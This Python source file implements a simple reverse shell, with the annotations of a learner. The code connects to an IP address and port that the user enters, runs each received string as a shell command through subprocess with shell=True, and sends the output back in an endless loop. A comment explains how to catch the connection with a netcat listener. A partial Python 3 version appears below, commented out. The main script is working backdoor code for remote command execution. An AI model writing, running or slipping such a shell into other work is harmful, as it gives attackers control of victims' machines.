#!/usr/bin/env python

import socket, subprocess

#to open listening connection on target computer using netcat:
#nc -vv -l -p 4444
#netcat --veryverbose -listen -port ####

def execute_system_command(command):
    return subprocess.check_output(command, shell=True) #system command is a shell not a list so shell needs to be set to true
    #subprocess.check_output returns result, need to either store it as a var or return it
    
#python3:
#ip = input("Enter IP Address: ")
#port = input("Enter port number to use: ")
#buffer_size = input("Enter buffer size: ")

ip = raw_input("Enter IP Address: ")
port = int(raw_input("Enter port number to use: "))
buffer_size = int(raw_input("Enter buffer size: "))

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string

while True:
    command = connection.recv(buffer_size) #receive, specify buffer size
    command_result = execute_system_command(command)
    connection.send(command_result)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port






############################################################################
###Commented code below###
#!/usr/bin/env python3

import socket

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

ip = input("Enter IP Address: ")
port = input("Enter port number to use: ")
buffersize = input("Enter buffer size: ")

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
received_data = connection.recv(buffersize) #receive, specify buffer size
print(received_data)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port
